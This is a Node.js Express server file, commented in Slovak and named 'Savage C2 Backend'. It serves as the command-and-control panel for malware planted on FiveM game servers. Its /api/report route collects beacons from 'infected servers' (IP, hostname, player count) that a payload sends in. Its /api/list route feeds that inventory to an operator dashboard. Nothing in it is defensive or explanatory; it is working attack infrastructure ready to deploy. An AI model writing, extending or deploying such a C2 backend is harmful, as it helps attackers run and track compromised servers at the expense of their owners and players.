const express = require('express');
const cors = require('cors');
const path = require('path'); // Pridané pre prácu s priečinkami
const app = express();

app.use(express.json());
app.use(cors());

// --- NASTAVENIE FRONTENDU ---
// Povieme serveru, že tvoj index.html je v priečinku 'frontend'
// (Ak máš index.html v rovnakom priečinku ako server.js, zmeň '../frontend' na './')
app.use(express.static(path.join(__dirname, '../frontend')));

let infectedServers = []; 

// Cesta pre FiveM server (Payload)
app.post('/api/report', (req, res) => {
    const newServer = {
        ip: req.ip.replace('::ffff:', ''),
        hostname: req.body.hostname || "Neznámy Server",
        players: req.body.players || 0,
        lastSeen: new Date().toLocaleTimeString()
    };

    const index = infectedServers.findIndex(s => s.ip === newServer.ip);
    if (index > -1) {
        infectedServers[index] = newServer;
    } else {
        infectedServers.push(newServer);
    }

    console.log(`[!] Prijatý report od: ${newServer.hostname}`);
    res.status(200).send({ status: "ok" });
});

// Cesta pre tvoj Dashboard (Dáta)
app.get('/api/list', (req, res) => {
    res.json(infectedServers);
});

// HLAVNÁ STRÁNKA - Tu pošleme užívateľovi tvoj index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// --- PORT (DÔLEŽITÉ PRE RENDER) ---
const PORT = process.env.PORT || 10000; 
app.listen(PORT, '0.0.0.0', () => {
    console.log("-----------------------------------------");
    console.log(`Savage C2 Backend beží na porte ${PORT}`);
    console.log("-----------------------------------------");
});